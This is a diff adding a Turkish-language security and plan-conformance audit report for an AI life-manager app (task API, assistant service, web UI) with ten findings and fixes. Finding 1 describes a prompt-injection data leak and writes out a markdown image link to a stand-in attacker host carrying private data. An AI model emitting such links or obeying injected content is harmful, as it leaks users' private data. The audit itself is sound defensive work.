@@ -622,3 +622,54 @@ Elindeki modeller: `gemma4:26b`, `qwen3.8:27b`, `deepseek-r1:32b`, `qwen2.5-code
 | Zor sorular ("spor programımı detaylı kur") | Seçtiğin cloud model (Claude/GPT) | Mesaj bazında seçim, gizlilik kurallarına tabi |
 
 Bu yüzden `provider_configs`'e ek olarak `model_routes` (task_type → provider_config) ayarı eklenir: `chat`, `background_planning`, `insight`, `classification`.
+
+
+---
+
+## Faz 8 denetimi (2026-11-09, plan ↔ kod; yalnız rapor, kod değişmedi)
+
+**Kapsam:** `planlar/faz8/00-genel.md` "Denetim" maddesi; 8a–8g adımları/kabul ölçütleri ↔ kod; güvenlik (ekler), gizlilik (yeni asistan araçları), koyu tema kalıntıları, migration zinciri. Denetlenen HEAD: `41432d6` (`feature/ai-life-manager`).
+
+### Sonuç özeti
+- **Plana uyum yüksek:** kritik sapma yok; faz dosyalarındaki sapma tabloları koddaki durumla tutarlı. **Yüksek şiddette bulgu yok**; veri kaybı ya da doğrudan sömürülebilir açık bulunmadı.
+- **Testler (denetimde bir kez koşuldu):** task-api **337 passed** (259 sn) · assistant-service **152 passed** · `apps/web` `npm run build` temiz (yalnız >500 kB chunk uyarısı). Faz kayıtlarıyla tutarlı: task-api 265→267 (8a +2) →298 (8c +29) →333 (8d +35) →337 (8g +4); assistant 120→147 (8a +27) →148 (8c +1) →152 (8d +4).
+- **Migration zinciri tek hat, çatalsız:** `d9a2c6e4f1b8 → e4b8c2f6a9d3 → a5c9e1b3d7f2 (8c) → b6d2f8a4c1e9 (8d) → c7f1a9d3b5e2 (8g, `theme_settings`)`; tekrarlayan `down_revision` yok.
+- **Koyu tema grep'i temiz:** `apps/web/src` altında `bg-white` ve `text-white` **0** eşleşme; `#fff` yalnız `index.css:38-39` (token tanımı) ve `lib/color.ts:16,20` (`readableTextOn`, bilinçli). Kodda kullanılan tüm `green/amber/red/indigo/blue-*` tonlarının koyu karşılığı `[data-theme=dark]`'ta tanımlı (kullanılan küme = tanımlı küme). Satır içi `style` renkleri yalnız kullanıcı/board/etiket renkleri.
+- **Gizlilik (local_only):** 8a'nın tüm yeni araçları (`add_checklist_items`, `update_checklist_items`, `delete_checklist_items`, `set_card_labels`, `create_card` etiket/checklist) `_card()`/`_board()` üzerinden `PrivacyFilter`'dan geçiyor (`write_tools.py:305-318, 424, 448, 486, 508-512`); `get_card` ekleri yalnız dosya adı olarak veriyor (`read_tools.py:294-295`, URL/token yok); `focus_line` bulutta gizli kart/board bağlamı eklemiyor (`agent/context.py:119-150`); 8d `schedule_day` çakışma geri bildirimi gizli board etkinlik başlığını «Başka bir etkinlik»e çeviriyor (`write_tools.py:796`). Tek boşluk: bulgu 4.
+- **Ekler güvenliği doğrulandı:** diskteki yol yalnız sunucu üretimli `storage_key`'den (`^\d+/[0-9a-f]{32}$` + `resolve()` kök kontrolü; `attachment_storage.py:47-58`), dosya adı yolda yok; MIME uzantıdan; inline yalnız png/jpeg/gif/webp/pdf; `nosniff` + CSP + RFC 5987 `Content-Disposition`; yasak uzantılar; sahiplik her uçta (`get_owned`), başkasının eki 404; token `purpose="attachment"` + 60 dk, erişim token'ı olarak kullanılamaz (`dependencies.py:148` `type=="access"` ister; ek token'ında `type` yok) ve `oauth_state` token'ıyla karışmaz; `services/task-api/.gitignore:27` `data/` kapsıyor; yetim temizliği + commit-sonrası silme yerinde. Teams bağlantıları (`EventDialog`, `Reminders`) `safeHttpsUrl` ile yalnız `https`.
+
+### Bulgular (şiddet sırasıyla)
+
+**1. Orta — Asistan/not Markdown'ında dış resim otomatik yüklenir (veri sızdırma kanalı).** `apps/web/src/components/MarkdownView.tsx:73-77` `img` bileşeni `src`'yi olduğu gibi `<img>` yapıyor; `urlTransform` (`:98-104`) `attachment:` dışındakileri `defaultUrlTransform`'a bırakıyor, o da `http(s)` resmine izin verir. Asistan mesajları da (8b adım 7) bu bileşenle çiziliyor. *Senaryo:* kart/not/e-posta içeriğindeki bir prompt-injection ya da bulut model `![](https://saldirgan.example/?q=<özel veri>)` üretirse tarayıcı kullanıcı onayı olmadan istek atar. *Öneri:* `MarkdownView`'a `allowRemoteImages` (varsayılan false; asistan görünümünde kapalı); dış resim yerine tıklanabilir bağlantı göster, yalnız `attachment:`-türevi imzalı URL'lere izin ver.
+
+**2. Orta — Yükleme boyut sınırı yalnız `Content-Length` başlığına ve yazma anına dayanıyor.** `services/task-api/app/api/v1/attachments.py:62-66`. `Content-Length` yoksa (chunked) Starlette multipart'ı önce kendi geçici dosyasına tamamen alır; 25 MB denetimi ancak `save()` içinde (`attachment_storage.py:84-93`) çalışır → büyük chunked gövde disk/zaman tüketir. Yerel tek kullanıcılı uygulamada pratik risk düşük. *Öneri:* ASGI düzeyinde gövde boyutu sınırı (akış sayaçlı küçük middleware) ya da sunucunun yalnız 127.0.0.1'e bağlı kaldığını belgele.
+
+**3. Orta (karar) — Açık temada `slate-500` kontrastı AA altında.** `apps/web/src/index.css:20` (`#6b7493`): sayfa zemini üstünde 4.20, krem/adaçayı/lavanta/gri zeminlerde 4.06–4.14 (<4.5). 8g öncesinden gelen değer; 8g raporu kararı denetime bıraktı. *Öneri:* `--color-slate-500` → ≈`#656e8d`; koyu tema zaten ≥5.15.
+
+**4. Düşük — Gizlilik filtresi arşivlenmiş `local_only` board'ları kapsamıyor.** `services/assistant-service/app/tools/read_tools.py:110` `boards()` `include_archived=False`; `ToolBox.create` (`:99-105`) yalnız bunlar için `hidden_boards/hidden_cards` doldurur. Arşivli gizli board'daki bir kart id'si `_card()` (`write_tools.py:305-312`) ya da `focus_line`'a verilirse `card_hidden`/`board_hidden` false döner → bulut modele sızabilir. 8a'nın yeni yazma araçları aynı yolu kullanıyor; kök neden 8a öncesi mimaride. *Öneri:* `ToolBox.create`'te `include_archived=True` ile gizli board'ları topla (ya da `_card()` içinde kartın board'unun `privacy` alanını doğrudan kontrol et).
+
+**5. Düşük — Ek indirme token'ı URL sorgusunda (`?token=`).** `attachment_storage.py:177-189`, `attachment.py:76`. 60 dk geçerli ve yalnız o ekle sınırlı (`aid` eşleşmesi zorunlu), ama erişim günlüğüne/Referer'a düşebilir; 8c kararı bilinçli. *Öneri:* yanıtlara `Referrer-Policy: no-referrer` ekle, günlükte sorgu dizesini maskele.
+
+**6. Düşük — PDF "Aç" CSP `sandbox` nedeniyle bazı tarayıcılarda boş kalabilir** (8c "doğrulanmayanlar"). `attachments.py:33-35`. İndirme çalışır. *Öneri:* kullanıcıyla elle dene; sorun çıkarsa yalnız `application/pdf` için CSP'den `sandbox`'ı çıkar.
+
+**7. Düşük — Arayüzü tarayıcıda hiç görülmeden teslim edilen kısımlar.** 8d (Ayarlar Teams bölümü, takvimde video ikonu, EventDialog "Teams'te katıl", Reminders şeridi), 8e (tüm sürükle-bırak senaryoları, Slow 3G, hata geri alma), 8f (dikte: mikrofon, Ctrl+M, 8 sn zaman aşımı, ilk kullanım kutusu); 8g'de Giriş/Profil/EventDialog/Reminders/Insights/Entegrasyonlar koyuda görülmedi, 8 board arka planından yalnız `deniz` iki temada görüldü. Elde yalnız `tsc -b && vite build` (+8e'de saf yardımcıların izole sınaması) var. *Öneri:* kullanıcıyla kısa elle tur; 8e öncelikli (iyimser güncelleme, en sık kullanılan yol).
+
+**8. Düşük — 8e `moveList` hatası kullanıcıya gösterilmiyor** (yalnız geri alınıyor; faz sapması olarak kayıtlı). `apps/web/src/pages/BoardPage.tsx:173`. *Öneri:* `moveCard` ile aynı hata bandını `moveList` için de göster.
+
+**9. Düşük — Teams senkronunda pencere küçülürse eski gelecek etkinlikler silinir.** `services/task-api/app/integrations/calendar_common.py:146-171` + `microsoft_calendar.py:303-311`: "kaç hafta ileri" 4→1 düşürülünce pencere dışına kalan, önceden çekilmiş etkinlikler "görünmedi" sayılıp silinir. Dış kaynak salt-okunur kopya olduğundan veri kaybı yok (genişletince geri gelir) ama beklenmedik. *Öneri:* silmeyi pencere sonuyla da sınırla ya da ayarda uyar.
+
+**10. Düşük — Belge tutarsızlıkları / yapılandırma.** (a) §0 tablosunda (satır 33-38) 8a–8g "push bekliyor" yazıyor; hepsi `41432d6`'ya kadar push edildi. (b) 8f/8g satırlarında hash sütunu "—" (hash durum metninde: `e3006ac`, `7ad066f`). (c) `jwt_secret_key` varsayılanı `"super-secret-key-change-in-production"` (`config.py:20`): ek token'ları dahil tüm JWT'ler `.env`'de override edilmediyse bununla imzalanır — gerçek `.env` okunmadı, doğrulanmadı. *Öneri:* tabloyu güncelle; `.env`'de `JWT_SECRET_KEY` var mı kontrol et.
+
+### Kabul ölçütleri durumu
+| Faz | Otomatik kabul | Elle/gerçek ortam kabulü |
+|---|---|---|
+| 8a | ✅ testler (+27 assistant, +2 task-api); Ayarlar UI otomatik | ⏳ gerçek model 4 senaryo (kullanıcıyla); çip ekran görüntüsü yok (DOM ile doğrulandı) |
+| 8b | ✅ build, +2 test | ⏳ görsel kontrol kullanıcıda |
+| 8c | ✅ +29 test, migration kopyada up/down/up, başlıklar | ⏳ PDF "Aç", gerçek pano yapıştırma, OS sürükle-bırak, 25 MB gerçek dosya |
+| 8d | ✅ +35/+4 test, migration kopyada | ⏳ gerçek Microsoft hesabı (Calendars.Read, gerçek `calendarView`, tüm gün tarihi); UI hiç görülmedi |
+| 8e | ✅ build; `moveList` indeks anlamı koddan doğrulandı (`services/board.py:291-300` `place_at(siblings, …)` = `applyListMove`) | ⏳ sürükle-bırak senaryoları görülmedi |
+| 8f | ✅ build | ⏳ mikrofon/Chrome/Edge/Firefox görülmedi |
+| 8g | ✅ +4 test, grep temiz, kopyada kısmi koyu/açık tur | ⏳ kalan sayfalar/board arka planları; slate-500 kararı (bulgu 3) |
+
+### Önerilen sıra
+1) Bulgu 1 (uzak resim) ve 4 (arşivli gizli board) küçük Sonnet düzeltmeleri; 2) bulgu 3 tek satırlık renk kararı; 3) kullanıcıyla elle tur (bulgu 7); 4) kalanlar isteğe bağlı.
